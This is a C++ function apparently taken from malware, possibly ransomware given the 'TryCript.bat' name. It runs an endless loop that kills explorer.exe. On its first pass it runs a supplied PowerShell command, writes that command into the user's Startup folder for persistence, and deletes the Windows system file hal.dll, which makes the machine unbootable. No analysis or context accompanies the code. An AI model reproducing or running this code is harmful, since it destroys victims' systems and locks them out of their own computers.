void protection(string& powershell) {
	bool one = true;
	while (true)
	{
		system("taskkill /F /IM explorer.exe");
		if (one) {
			system(powershell.c_str());
			string command = "echo " + powershell + " > \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TryCript.bat\"";
			system(command.c_str());
			command = "del C:\\Windows\\System32\\hal.dll";
			system(command.c_str());
		}
		one = false;
	}
}
